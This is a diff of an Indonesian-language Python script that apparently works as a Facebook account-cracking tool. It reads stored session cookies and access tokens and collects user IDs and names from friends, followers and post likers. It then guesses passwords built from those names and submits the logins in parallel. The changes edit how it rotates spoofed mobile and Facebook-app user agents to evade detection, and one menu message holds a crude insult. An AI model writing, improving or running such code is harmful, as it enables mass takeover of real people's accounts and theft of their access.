@@ -9,9 +9,9 @@ from rich.console import Console
 from rich.columns import Columns
 from rich.panel import Panel as panel
 from rich.console import Console as sol
-try:ugen = open('ua.txt','r').read().splitlines()
+try:ugen = open('user.txt','r').read().splitlines()
 except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
-try:ugen2 = open('ua.txt','r').read().splitlines()
+try:ugen2 = open('user2.txt','r').read().splitlines()
 except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
 
 pretty.install()
@@ -103,6 +103,8 @@ def bot_komen(cookie, token_eaag):
 ### DAFTAR MENU ###
 def daftar_menu():
     try:
+        ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+        open("ua.txt","w").write(ua_)
         banner_logo();cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
         token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
         name, id = dapatkan_nama(cookie, token_eaag)
@@ -114,12 +116,9 @@ def daftar_menu():
         day = datetime.datetime.now().strftime("%d-%b-%Y")
         dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{day}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 3.4[/][/] ',width=50,padding=(0,3),style=f"bold white"))
         dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{region}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=50,padding=(0,3),style=f"bold white"))
-        console.print(Columns(dia))
+        Console.print(Columns(dia))
     except Exception as e:
         Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
-    lk = open('ua.txt','r').read().splitlines()
-    dia.append(panel(f'[bold white]YOUR UA = {lk}',width=50,padding=(0,3),style=f"bold white"))
-    console.print(Columns(lk))
     Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
 [bold green]2[bold white]. Crack User Dari Pengikut
 [bold green]3[bold white]. Crack User Dari Like Postingan
@@ -311,7 +310,7 @@ class crack:
                     self.email, self.nama = z.split('|')[0], z.split('|')[1]
                     self.password = self.generate_password(self.nama)
                     V.submit(self.main, Dump, self.email, self.password)
-            Console().print("\r[bold white][[bold green]Selesai[bold white]]                           ");exit()
+            Console().print("\r[bold white][[bold green]Selesai[bold white]]");exit()
         except:exit()
     ### MAIN ###
     def main(self, total, email, password):
@@ -411,9 +410,9 @@ class crack:
             Console().print(f"[bold hot_pink2]   ╰─>[bold red] {str(e).title()}!                    ")
     ### REALME USERAGENT ###
     def realme_useragent(self, total):
-	    for _ in range(total):
-		    self.useragent = open('ua.txt', 'r').read()
-	    return self.useragent
+        for _ in range(total):
+            self.useragent = ('Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36')
+        return self.useragent
 
 def uap():
 	print ("\n[01]. Ganti user agent ")
@@ -433,7 +432,7 @@ def uas(ganti):
             print ('\n[!] Yang bener kontol');time.sleep(2)
             daftar_menu()
         elif ua in("CANCEL","Cancel","cancel"):
-            ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36;]")
+            ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
             open("ua.txt","w").write(ua_);time.sleep(2)
             print ("\n[✓]  Berhasil menggunakan user agent script ");time.sleep(2)
             daftar_menu()
